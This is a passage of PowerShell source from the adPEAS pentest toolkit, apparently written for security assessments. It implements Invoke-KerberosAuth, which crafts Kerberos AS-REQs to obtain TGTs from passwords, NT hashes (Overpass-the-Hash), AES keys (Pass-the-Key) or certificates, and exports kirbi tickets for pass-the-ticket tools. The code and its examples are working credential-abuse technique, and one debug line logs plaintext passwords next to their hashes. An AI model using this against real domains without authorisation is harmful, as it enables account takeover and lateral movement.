    Format: 64 hex characters

.PARAMETER AES128Key
    AES128 key for AES128-CTS-HMAC-SHA1-96 authentication (Pass-the-Key).
    Format: 32 hex characters

.PARAMETER Certificate
    Certificate for PKINIT authentication. Accepts:
    - X509Certificate2 object
    - Path to a PFX certificate file
    - Base64-encoded PFX data
    The function auto-detects the input type.

.PARAMETER CertificatePassword
    Password for the PFX certificate file (optional, empty string if no password).

.PARAMETER PreferredEType
    Preferred encryption type for password-based auth (18=AES256, 17=AES128, 23=RC4).
    Default: 18 (AES256)

.PARAMETER OutputKirbi
    Optional path to save the TGT as a .kirbi file.

.PARAMETER NoPAC
    Request TGT without PAC (Privilege Attribute Certificate).

.PARAMETER OutputTicketOnly
    Returns only the Base64-encoded KRB-CRED (kirbi format) as a single-line string.
    This includes the session key, making it directly usable with:
    - Connect-adPEAS -Kirbi <ticket>
    - Rubeus ptt /ticket:<ticket>
    - Impacket tools

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -Credential (Get-Credential)
    Authenticates using password from PSCredential object.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -Password "P@ssw0rd123"
    Authenticates using plain text password.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -NTHash "32ED87BDB5FDC5E9CBA88547376818D4"
    Performs Overpass-the-Hash using the NT-Hash.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -AES256Key "4a3b2c1d5e6f..."
    Performs Pass-the-Key using the AES256 key.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -Certificate "user.pfx"
    Authenticates using PKINIT with a certificate file.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -Certificate "MIIKwgYJKoZI..."
    Authenticates using PKINIT with a Base64-encoded certificate.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -Certificate $x509Cert
    Authenticates using PKINIT with an X509Certificate2 object.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -NTHash "32ED87..." -OutputTicketOnly
    Returns only the Base64 ticket string (single line) for easy copy-paste.

.EXAMPLE
    Invoke-KerberosAuth -UserName "john.doe" -Domain "contoso.com" -Password "pass" -OutputTicketOnly | Set-Clipboard
    Gets TGT and copies directly to clipboard.

.OUTPUTS
    PSCustomObject with authentication result including TGT and session key.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    References:
    - RFC 4120: Kerberos V5
    - RFC 3961: Kerberos Cryptographic Framework
    - RFC 3962: AES Encryption for Kerberos 5
    - RFC 4556: PKINIT
    - RFC 4757: RC4-HMAC Kerberos Encryption
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$UserName,

        [Parameter(Mandatory=$true, Position=1)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$DomainController,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$NTHash,

        [Parameter(Mandatory=$false)]
        [ValidatePattern('^[0-9a-fA-F]{64}$')]
        [string]$AES256Key,

        [Parameter(Mandatory=$false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$AES128Key,

        [Parameter(Mandatory=$false)]
        $Certificate,  # Accepts X509Certificate2, string (file path), or string (Base64)

        [Parameter(Mandatory=$false)]
        [string]$CertificatePassword = "",

        [Parameter(Mandatory=$false)]
        [ValidateSet(18, 17, 23)]
        [int]$PreferredEType = 18,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [switch]$NoPAC,

        [Parameter(Mandatory=$false)]
        [switch]$OutputTicketOnly
    )

    begin {
        Write-Log "[Invoke-KerberosAuth] Starting unified Kerberos authentication..."

        # Use PSBoundParameters to detect if parameter was provided (allows empty string passwords)
        $authMethods = @()
        if ($Credential) { $authMethods += "Credential" }
        if ($PSBoundParameters.ContainsKey('Password')) { $authMethods += "Password" }
        if ($NTHash) { $authMethods += "NTHash" }
        if ($AES256Key) { $authMethods += "AES256Key" }
        if ($AES128Key) { $authMethods += "AES128Key" }
        if ($Certificate) { $authMethods += "Certificate" }

        if ($authMethods.Count -eq 0) {
            throw "You must provide one authentication method: -Credential, -Password, -NTHash, -AES256Key, -AES128Key, or -Certificate"
        }
        if ($authMethods.Count -gt 1) {
            throw "You can only provide one authentication method at a time. Provided: $($authMethods -join ', ')"
        }

        $AuthMethodType = $authMethods[0]

        # Check for custom DNS configuration
        $CustomDnsServer = $null
        if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
            $CustomDnsServer = $Script:LDAPContext['DnsServer']
            Write-Log "[Invoke-KerberosAuth] Custom DNS server configured: $CustomDnsServer"
        }

        if (-not $DomainController) {
            # Resolve DC using unified resolver
            $dcResult = Resolve-adPEASName -Domain $Domain -DnsServer $CustomDnsServer
            Write-Log "[Invoke-KerberosAuth] DC resolution: Hostname=$($dcResult.Hostname), IP=$($dcResult.IP)"

            # Prefer IP address if available (for custom DNS scenarios)
            if ($dcResult.IP) {
                $DomainController = $dcResult.IP
                Write-Log "[Invoke-KerberosAuth] Using resolved IP: $DomainController"
            }
            elseif ($dcResult.Hostname) {
                $DomainController = $dcResult.Hostname
                Write-Log "[Invoke-KerberosAuth] Using resolved hostname: $DomainController"
            }
            else {
                # Fallback to domain name
                $DomainController = $Domain
                Write-Log "[Invoke-KerberosAuth] Using domain name as fallback: $DomainController"
            }
        }
        else {
            # Explicit DomainController provided - resolve to IP if custom DNS is used
            if ($CustomDnsServer) {
                $ipTest = $null
                if (-not [System.Net.IPAddress]::TryParse($DomainController, [ref]$ipTest)) {
                    # Resolve hostname to IP via custom DNS (use -Name, not -Domain since DC is explicit)
                    $ResolvedIP = Resolve-adPEASName -Name $DomainController -DnsServer $CustomDnsServer
                    if ($ResolvedIP) {
                        Write-Log "[Invoke-KerberosAuth] Resolved explicit DC $DomainController to IP: $ResolvedIP"
                        $DomainController = $ResolvedIP
                    }
                }
            }
        }

        function New-PAEncTimestamp {
            param(
                [byte[]]$Key,
                [int]$EType
            )

            $now = [datetime]::UtcNow
            $pausec = $now.Millisecond * 1000

            $paEncTsEnc = @()
            $paEncTsEnc += New-ASN1ContextTag -Tag 0 -Data (New-ASN1GeneralizedTime -Value $now)
            $paEncTsEnc += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $pausec)
            $paEncTsEncSeq = New-ASN1Sequence -Data $paEncTsEnc

            $keyUsage = 1

            switch ($EType) {
                23 { $encrypted = Encrypt-RC4HMAC -Key $Key -Data $paEncTsEncSeq -KeyUsage $keyUsage }
                17 { $encrypted = Encrypt-AESCTS -Key $Key -Data $paEncTsEncSeq -KeyUsage $keyUsage }
                18 { $encrypted = Encrypt-AESCTS -Key $Key -Data $paEncTsEncSeq -KeyUsage $keyUsage }
                default { throw "Unsupported encryption type: $EType" }
            }

            $encryptedData = New-KerberosEncryptedData -EType $EType -Cipher $encrypted

            return $encryptedData
        }

        function New-KerberosASREQ {
            param(
                [string]$UserName,
                [string]$Realm,
                [byte[]]$Key,
                [int]$EType,
                [switch]$NoPAC,
                [switch]$NoPreAuth  # Send AS-REQ without PA-ENC-TIMESTAMP to get PA-ETYPE-INFO2
            )

            $realmUpper = $Realm.ToUpper()
            $nonce = [uint32](Get-Random -Minimum 1 -Maximum 2147483647)

            # Build padata array
            $padataItems = @()

            # PA-ENC-TIMESTAMP (only if we have a key and not requesting salt)
            if (-not $NoPreAuth -and $Key) {
                $paEncTs = New-PAEncTimestamp -Key $Key -EType $EType
                $paPaEncTs = New-KerberosPAData -PADataType $Script:PA_ENC_TIMESTAMP -PADataValue $paEncTs
                $padataItems += $paPaEncTs
            }

            # PA-PAC-REQUEST
            $pacRequest = if ($NoPAC) {
                New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $false))
            } else {
                New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $true))
            }
            $paPacReq = New-KerberosPAData -PADataType $Script:PA_PAC_REQUEST -PADataValue $pacRequest
            $padataItems += $paPacReq

            $padata = New-ASN1Sequence -Data $padataItems

            # KDC-OPTIONS
            $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -RenewableOK

            # cname
            $cname = New-KerberosPrincipalName -NameType $Script:NT_PRINCIPAL -NameStrings @($UserName)

            # sname - krbtgt/REALM
            $sname = New-KerberosPrincipalName -NameType $Script:NT_SRV_INST -NameStrings @("krbtgt", $realmUpper)

            # till
            $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)

            # etype - request the same type we're using
            $etypeASN = New-ASN1Integer -Value $EType

            # KDC-REQ-BODY
            $reqBodyContent = @()
            $reqBodyContent += New-ASN1ContextTag -Tag 0 -Data $kdcOptions
            $reqBodyContent += New-ASN1ContextTag -Tag 1 -Data $cname
            $reqBodyContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $realmUpper)
            $reqBodyContent += New-ASN1ContextTag -Tag 3 -Data $sname
            $reqBodyContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)
            $reqBodyContent += New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonce)
            $reqBodyContent += New-ASN1ContextTag -Tag 8 -Data (New-ASN1Sequence -Data $etypeASN)

            $reqBody = New-ASN1Sequence -Data $reqBodyContent

            # KDC-REQ
            $kdcReqContent = @()
            $kdcReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 5)
            $kdcReqContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Script:KRB_AS_REQ)
            $kdcReqContent += New-ASN1ContextTag -Tag 3 -Data $padata
            $kdcReqContent += New-ASN1ContextTag -Tag 4 -Data $reqBody

            $kdcReq = New-ASN1Sequence -Data $kdcReqContent

            # AS-REQ = APPLICATION 10
            $asReq = New-ASN1ApplicationTag -Tag 10 -Data $kdcReq

            return @{
                ASReq = $asReq
                Nonce = $nonce
            }
        }

        function Parse-ASREP {
            param([byte[]]$Data)

            $result = @{
                Success = $false
                Error = $null
                ErrorCode = $null  # KDC error code (integer) for structured error handling
                ServerTime = $null # KDC server time from KRB-ERROR stime field
                Ticket = $null
                EncPart = $null
                EType = $null
                Kvno = $null
                ETypeInfo2 = $null  # PA-ETYPE-INFO2 from e-data (contains salt for AES)
            }

            try {
                $root = Read-ASN1Element -Data $Data -Offset 0
                Write-Debug "[Parse-ASREP] Root tag: $($root.Tag) (masked: $($root.Tag -band 0x1F))"

                if (($root.Tag -band 0x1F) -eq 30) {
                    Write-Debug "[Parse-ASREP] Detected KRB-ERROR response"

                    # KRB-ERROR structure: [APPLICATION 30] SEQUENCE { fields }
                    # The root.Content contains SEQUENCE which wraps the actual fields
                    $sequenceElement = Read-ASN1Element -Data $root.Content -Offset 0
                    Write-Debug "[Parse-ASREP] Inner element tag: $($sequenceElement.Tag) (TagNumber: $($sequenceElement.TagNumber))"

                    # Get the content to parse - if it's a SEQUENCE (0x30), use its content
                    # Otherwise, the APPLICATION tag directly contains the fields
                    $contentToParse = if ($sequenceElement.Tag -eq 0x30) {
                        Write-Debug "[Parse-ASREP] Parsing inner SEQUENCE content"
                        $sequenceElement.Content
                    } else {
                        Write-Debug "[Parse-ASREP] Parsing APPLICATION content directly"
                        $root.Content
                    }

                    $children = Read-ASN1Children -Data $contentToParse
                    $errorCode = $null
                    $errorText = $null
                    $edata = $null
                    $serverTime = $null

                    foreach ($child in $children) {
                        Write-Debug "[Parse-ASREP] Processing child tag: $($child.Tag) (TagNumber: $($child.TagNumber))"
                        if ($child.TagNumber -eq 4) {
                            # stime [4] KerberosTime - server time at error generation
                            try {
                                $stimeStr = Read-ASN1String -Content (Read-ASN1Element -Data $child.Content).Content
                                $serverTime = [DateTime]::ParseExact($stimeStr, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                                Write-Debug "[Parse-ASREP] Server time (stime): $serverTime"
                            } catch {
                                Write-Debug "[Parse-ASREP] Failed to read stime: $_"
                            }
                        }
                        elseif ($child.TagNumber -eq 6) {
                            # error-code [6] INTEGER
                            try {
                                $innerElement = Read-ASN1Element -Data $child.Content
                                $errorCode = Read-ASN1Integer -Content $innerElement.Content
                                Write-Debug "[Parse-ASREP] Error code: $errorCode"
                            } catch {
                                Write-Debug "[Parse-ASREP] Failed to read error code: $_"
                            }
                        }
                        elseif ($child.TagNumber -eq 11) {
                            # e-text [11] KerberosString OPTIONAL
                            try {
                                $errorText = Read-ASN1String -Content (Read-ASN1Element -Data $child.Content).Content
                                Write-Debug "[Parse-ASREP] Error text: $errorText"
                            } catch { }
                        }
                        elseif ($child.TagNumber -eq 12) {
                            # e-data [12] OCTET STRING OPTIONAL (contains PA-DATA or METHOD-DATA)
                            try {
                                $edata = (Read-ASN1Element -Data $child.Content).Content
                                Write-Debug "[Parse-ASREP] e-data present, length: $($edata.Length)"
                            } catch { }
                        }
                    }

                    # Store error code as separate property for structured error handling
                    $result.ErrorCode = $errorCode
                    $result.ServerTime = $serverTime

                    $result.Error = "KRB-ERROR"
                    if ($null -ne $errorCode) { $result.Error = "KRB-ERROR $errorCode" }
                    if ($errorText) { $result.Error += ": $errorText" }

                    # Use centralized Kerberos error code mapping
                    if ($null -ne $errorCode) {
                        $errorDesc = Get-KerberosErrorMessage -ErrorCode $errorCode
                        $result.Error += " ($errorDesc)"
                    }

                    # For clock skew errors, append DC time and offset
                    if ($errorCode -eq 37 -and $serverTime) {
                        $localTimeUTC = [DateTime]::UtcNow
                        $skew = $serverTime - $localTimeUTC
                        $skewStr = if ($skew.TotalSeconds -ge 0) { "+$($skew.ToString('hh\:mm\:ss'))" } else { "-$(([Math]::Abs($skew.TotalSeconds) -as [TimeSpan]).ToString('hh\:mm\:ss'))" }
                        $result.Error += " | DC time: $($serverTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC, Local: $($localTimeUTC.ToString('yyyy-MM-dd HH:mm:ss')) UTC, Offset: $skewStr"
                    }

                    # Parse PA-ETYPE-INFO2 from edata if present (for preauth required errors)
                    # PA-ETYPE-INFO2 contains the correct salt for AES key derivation
                    if ($edata -and $errorCode -eq 25) {
                        try {
                            # e-data contains METHOD-DATA which is a SEQUENCE of PA-DATA
                            # METHOD-DATA ::= SEQUENCE OF PA-DATA
                            # PA-DATA ::= SEQUENCE {
                            #     padata-type [1] INTEGER,
                            #     padata-value [2] OCTET STRING
                            # }
                            $edataElement = Read-ASN1Element -Data $edata -Offset 0
                            Write-Debug "[Parse-ASREP] e-data element tag: $($edataElement.Tag), content length: $($edataElement.ContentLength)"

                            # Read-ASN1Children returns elements where .Content is the inner data
                            # Each PA-DATA is a SEQUENCE, so the element tag should be 0x30
                            $paDataSeq = Read-ASN1Children -Data $edataElement.Content
                            Write-Debug "[Parse-ASREP] Parsing e-data: $($paDataSeq.Count) PA-DATA entries"

                            foreach ($paItem in $paDataSeq) {
                                Write-Debug "[Parse-ASREP] PA-DATA item tag: $($paItem.Tag)"

                                # paItem is already a parsed element from Read-ASN1Children
                                # paItem.Content contains the inner data of this SEQUENCE
                                # We need to parse the children of this PA-DATA SEQUENCE
                                $paChildren = Read-ASN1Children -Data $paItem.Content

                                $paType = $null
                                $paValue = $null

                                foreach ($paChild in $paChildren) {
                                    Write-Debug "[Parse-ASREP] PA-DATA child tag: $($paChild.Tag), TagNumber: $($paChild.TagNumber)"
                                    if ($paChild.TagNumber -eq 1) {
                                        # padata-type [1] INTEGER - context tag wraps the INTEGER
                                        $paTypeElement = Read-ASN1Element -Data $paChild.Content
                                        $paType = Read-ASN1Integer -Content $paTypeElement.Content
                                        Write-Debug "[Parse-ASREP] PA-DATA type: $paType"
                                    }
                                    elseif ($paChild.TagNumber -eq 2) {
                                        # padata-value [2] OCTET STRING - context tag wraps the OCTET STRING
                                        $paValueElement = Read-ASN1Element -Data $paChild.Content
                                        $paValue = $paValueElement.Content
                                        Write-Debug "[Parse-ASREP] PA-DATA value length: $($paValue.Length)"
                                    }
                                }

                                # PA-ETYPE-INFO2 (type 19) - RFC 4120
                                # ETYPE-INFO2 ::= SEQUENCE OF ETYPE-INFO2-ENTRY
                                # ETYPE-INFO2-ENTRY ::= SEQUENCE {
                                #   etype     [0] Int32,
                                #   salt      [1] KerberosString OPTIONAL,
                                #   s2kparams [2] OCTET STRING OPTIONAL
                                # }
                                if ($paType -eq 19 -and $paValue) {
                                    Write-Debug "[Parse-ASREP] Found PA-ETYPE-INFO2, parsing..."
                                    try {
                                        $etypeInfo2Seq = Read-ASN1Element -Data $paValue -Offset 0
                                        Write-Debug "[Parse-ASREP] ETYPE-INFO2 outer tag: $($etypeInfo2Seq.Tag)"
                                        $etypeInfo2Entries = Read-ASN1Children -Data $etypeInfo2Seq.Content

                                        foreach ($entry in $etypeInfo2Entries) {
                                            Write-Debug "[Parse-ASREP] ETYPE-INFO2-ENTRY tag: $($entry.Tag)"
                                            # entry is a SEQUENCE element, its Content has the fields
                                            $entryChildren = Read-ASN1Children -Data $entry.Content

                                            $entryEType = $null
                                            $entrySalt = $null

                                            foreach ($field in $entryChildren) {
                                                Write-Debug "[Parse-ASREP] ETYPE-INFO2 field tag: $($field.Tag), TagNumber: $($field.TagNumber)"
                                                if ($field.TagNumber -eq 0) {
                                                    # etype [0] Int32
                                                    $etypeElement = Read-ASN1Element -Data $field.Content
                                                    $entryEType = Read-ASN1Integer -Content $etypeElement.Content
                                                    Write-Debug "[Parse-ASREP] Parsed etype: $entryEType"
                                                }
                                                elseif ($field.TagNumber -eq 1) {
                                                    # salt [1] KerberosString
                                                    $saltElement = Read-ASN1Element -Data $field.Content
                                                    $entrySalt = Read-ASN1String -Content $saltElement.Content
                                                    Write-Debug "[Parse-ASREP] Parsed salt: $entrySalt"
                                                }
                                            }

                                            Write-Debug "[Parse-ASREP] ETYPE-INFO2-ENTRY: etype=$entryEType, salt=$entrySalt"

                                            # Store first entry with salt (usually AES256)
                                            if ($entrySalt -and -not $result.ETypeInfo2) {
                                                $result.ETypeInfo2 = @{
                                                    EType = $entryEType
                                                    Salt = $entrySalt
                                                }
                                                Write-Debug "[Parse-ASREP] Using salt from PA-ETYPE-INFO2: $entrySalt"
                                            }
                                        }
                                    } catch {
                                        Write-Debug "[Parse-ASREP] Failed to parse PA-ETYPE-INFO2: $_"
                                    }
                                }
                            }
                        } catch {
                            Write-Debug "[Parse-ASREP] Failed to parse e-data: $_"
                        }
                    }

                    return $result
                }

                if (($root.Tag -band 0x1F) -ne 11) {
                    $result.Error = "Unexpected response type: $($root.Tag)"
                    return $result
                }

                # AS-REP is [APPLICATION 11] which wraps a SEQUENCE
                # The root.Content contains the SEQUENCE, so we need to parse it first
                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                $children = Read-ASN1Children -Data $innerSeq.Content

                foreach ($child in $children) {
                    switch ($child.TagNumber) {
                        5 {
                            $result.Ticket = $child.Content
                        }
                        6 {
                            $encPartSeq = Read-ASN1Element -Data $child.Content
                            $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content

                            foreach ($encChild in $encPartChildren) {
                                if ($encChild.TagNumber -eq 0) {
                                    $result.EType = Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content
                                }
                                elseif ($encChild.TagNumber -eq 1) {
                                    $result.Kvno = Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content
                                }
                                elseif ($encChild.TagNumber -eq 2) {
                                    $result.EncPart = (Read-ASN1Element -Data $encChild.Content).Content
                                }
                            }
                        }
                    }
                }

                $result.Success = $true
            }
            catch {
                $result.Error = "Failed to parse AS-REP: $_"
            }

            return $result
        }

        function Parse-EncASRepPart {
            param(
                [byte[]]$Data,
                [byte[]]$Key,
                [int]$EType
            )

            # AS-REP enc-part: RFC 4120 specifies key usage 3 (encrypted with client long-term key).
            # RC4-HMAC against Windows KDCs uses key usage 8 instead - a historic Microsoft quirk
            # (early Win2000 KDC conflated AS-REP/TGS-REP enc-part) documented in RFC 4757.
            # MIT Kerberos and Impacket apply the same 3->8 remap for ARCFOUR_HMAC.
            $keyUsage = if ($EType -eq 23) { 8 } else { 3 }

            try {
                switch ($EType) {
                    23 { $decrypted = Decrypt-RC4HMAC -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    17 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    18 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    default { throw "Unsupported encryption type: $EType" }
                }
            }
            catch {
                return @{ Success = $false; Error = "Decryption failed: $_" }
            }

            $result = @{
                Success = $true
                SessionKey = $null
                SessionKeyType = $null
                TicketFlags = $null
                AuthTime = $null
                StartTime = $null
                EndTime = $null
                RenewTill = $null
            }

            try {
                $root = Read-ASN1Element -Data $decrypted

                # EncASRepPart is [APPLICATION 25] which contains a SEQUENCE
                # We need to parse the inner SEQUENCE first
                $contentToParse = $root.Content
                if ($root.Tag -eq 0x30) {
                    # Already a SEQUENCE - use directly
                    $contentToParse = $root.Content
                } else {
                    # APPLICATION tag wrapping a SEQUENCE
                    $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                    $contentToParse = $innerSeq.Content
                }

                $children = Read-ASN1Children -Data $contentToParse

                # EncKDCRepPart structure (RFC 4120):
                # key             [0] EncryptionKey,
                # last-req        [1] LastReq,
                # nonce           [2] UInt32,
                # key-expiration  [3] KerberosTime OPTIONAL,
                # flags           [4] TicketFlags,
                # authtime        [5] KerberosTime,
                # starttime       [6] KerberosTime OPTIONAL,
                # endtime         [7] KerberosTime,
                # renew-till      [8] KerberosTime OPTIONAL,

                foreach ($child in $children) {
                    switch ($child.TagNumber) {
                        0 {
                            # key [0] EncryptionKey
                            $keySeq = Read-ASN1Element -Data $child.Content
                            $keyChildren = Read-ASN1Children -Data $keySeq.Content

                            foreach ($keyChild in $keyChildren) {
                                if ($keyChild.TagNumber -eq 0) {
                                    # keytype [0] INTEGER
                                    $result.SessionKeyType = Read-ASN1Integer -Content (Read-ASN1Element -Data $keyChild.Content).Content
                                }
                                elseif ($keyChild.TagNumber -eq 1) {
                                    # keyvalue [1] OCTET STRING
                                    $result.SessionKey = (Read-ASN1Element -Data $keyChild.Content).Content
                                }
                            }
                        }
                        4 {
                            # flags [4] TicketFlags (BIT STRING, 4 bytes)
                            $flagElement = Read-ASN1Element -Data $child.Content
                            # BIT STRING: first byte is number of unused bits, remaining bytes are the flag data
                            if ($flagElement.Content.Length -ge 5) {
                                # Standard: 1 byte unused-bits + 4 bytes flags
                                $result.TicketFlags = $flagElement.Content[1..4]
                            } elseif ($flagElement.Content.Length -eq 4) {
                                # Some implementations omit unused-bits prefix
                                $result.TicketFlags = $flagElement.Content
                            }
                        }
                        5 {
                            # authtime [5] KerberosTime
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.AuthTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        6 {
                            # starttime [6] KerberosTime OPTIONAL
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.StartTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        7 {
                            # endtime [7] KerberosTime - MANDATORY, this is when TGT expires
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.EndTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        8 {
                            # renew-till [8] KerberosTime OPTIONAL - renewable until this time
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.RenewTill = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                    }
                }
            }
            catch {
                $result.Success = $false
                $result.Error = "Failed to parse EncASRepPart: $_"
            }

            return $result
        }

        # Helper function to build KRB-CRED and return as Base64
        # Centralizes the Build-KRBCred logic to avoid code duplication
        function ConvertTo-KRBCredBase64 {
            param(
                [byte[]]$TicketBytes,
                [byte[]]$SessionKeyBytes,
                [int]$SessionKeyType,
                [string]$Realm,
                [string]$ClientName,
                [byte[]]$TicketFlags,
                $StartTime,
                $EndTime,
                $RenewTill
            )

            # Validate required parameters
            if (-not $TicketBytes -or $TicketBytes.Length -eq 0) {
                Write-Warning "[ConvertTo-KRBCredBase64] TicketBytes is null or empty"
                return $null
            }
            if (-not $SessionKeyBytes -or $SessionKeyBytes.Length -eq 0) {
                Write-Warning "[ConvertTo-KRBCredBase64] SessionKeyBytes is null or empty - cannot create valid KRB-CRED"
                return $null
            }

            $buildParams = @{
                Ticket = $TicketBytes
                SessionKey = $SessionKeyBytes
                SessionKeyType = $SessionKeyType
                Realm = $Realm
                ClientName = $ClientName
                ServerName = "krbtgt"
                ServerInstance = $Realm
                StartTime = $StartTime
                EndTime = $EndTime
                RenewTill = $RenewTill
            }
            if ($TicketFlags) { $buildParams['TicketFlags'] = $TicketFlags }

            $krbCred = Build-KRBCred @buildParams
            return [Convert]::ToBase64String($krbCred)
        }

        # Helper function to add CopyTicket and ShowTicket ScriptMethods to result object
        function Add-TicketHelperMethods {
            param(
                [Parameter(Mandatory=$true)]
                [PSCustomObject]$ResultObject
            )

            $ResultObject | Add-Member -MemberType ScriptMethod -Name "CopyTicket" -Value {
                if ($this.Ticket) {
                    $this.Ticket | Set-Clipboard
                    Write-Host "[+] Ticket copied to clipboard (Base64, single line)" -ForegroundColor Green
                }
            }

            $ResultObject | Add-Member -MemberType ScriptMethod -Name "ShowTicket" -Value {
                if ($this.Ticket) {
                    Write-Host "`n[Ticket Base64 - Single Line]" -ForegroundColor Cyan
                    Write-Host $this.Ticket -ForegroundColor White
                    Write-Host ""
                }
            }

            return $ResultObject
        }
    }

    process {
        try {
            $realmUpper = $Domain.ToUpper()

            # Initialize AuthMethod with fallback value (used in error handler)
            $AuthMethod = "Unknown"

            switch ($AuthMethodType) {
                { $_ -in @("Credential", "Password") } {
                    # Extract plaintext password from source
                    if ($AuthMethodType -eq "Credential") {
                        $PlainPassword = $Credential.GetNetworkCredential().Password
                        $AuthMethod = "Password (from Credential)"
                    } else {
                        $PlainPassword = $Password
                        $AuthMethod = "Password"
                    }

                    # Derive key based on encryption type
                    # Salt format: UPPERCASE(REALM) + username (RFC 3962)
                    # NOTE: The username part is CASE-SENSITIVE! The salt uses the username
                    # exactly as stored in AD (typically with original casing from account creation).
                    # We try the provided username first, which should match what the user knows.
                    $EType = $PreferredEType
                    $Salt = $realmUpper + $UserName

                    switch ($EType) {
                        18 {
                            $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 32
                            Write-Log "[Invoke-KerberosAuth] Using AES256 with salt: $Salt"
                        }
                        17 {
                            $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 16
                            Write-Log "[Invoke-KerberosAuth] Using AES128 with salt: $Salt"
                        }
                        default {
                            # RC4-HMAC uses NT-Hash (no salt needed)
                            $KeyBytes = Get-NTHashFromPassword -PlainPassword $PlainPassword
                            $ntHashHex = ($KeyBytes | ForEach-Object { $_.ToString('X2') }) -join ''
                            Write-Log "[Invoke-KerberosAuth] Using RC4-HMAC (NT-Hash)"
                            Write-Debug "[Invoke-KerberosAuth] Computed NT-Hash: $ntHashHex (from password: '$PlainPassword')"
                        }
                    }
                }

                "NTHash" {
                    $EType = 23
                    $KeyBytes = [byte[]]@(for ($i = 0; $i -lt 32; $i += 2) { [Convert]::ToByte($NTHash.Substring($i, 2), 16) })
                    $AuthMethod = "Overpass-the-Hash (RC4-HMAC)"
                }

                "AES256Key" {
                    $EType = 18
                    $KeyBytes = [byte[]]@(for ($i = 0; $i -lt 64; $i += 2) { [Convert]::ToByte($AES256Key.Substring($i, 2), 16) })
                    $AuthMethod = "Pass-the-Key (AES256)"
                }

                "AES128Key" {
                    $EType = 17
                    $KeyBytes = [byte[]]@(for ($i = 0; $i -lt 32; $i += 2) { [Convert]::ToByte($AES128Key.Substring($i, 2), 16) })
                    $AuthMethod = "Pass-the-Key (AES128)"
                }

                "Certificate" {
                    # Unified certificate handling - accepts X509Certificate2, file path, or Base64
                    $AuthMethod = "PKINIT (Certificate)"
                    Write-Log "[Invoke-KerberosAuth] Starting PKINIT for $UserName@$realmUpper via $DomainController"

                    $pkInitParams = @{
                        Domain = $Domain
                        DomainController = $DomainController
                        UserName = $UserName
                        NoPAC = $NoPAC
                    }

                    # Handle different certificate input types
                    if ($Certificate -is [System.Security.Cryptography.X509Certificates.X509Certificate2]) {
                        # X509Certificate2 object - pass directly
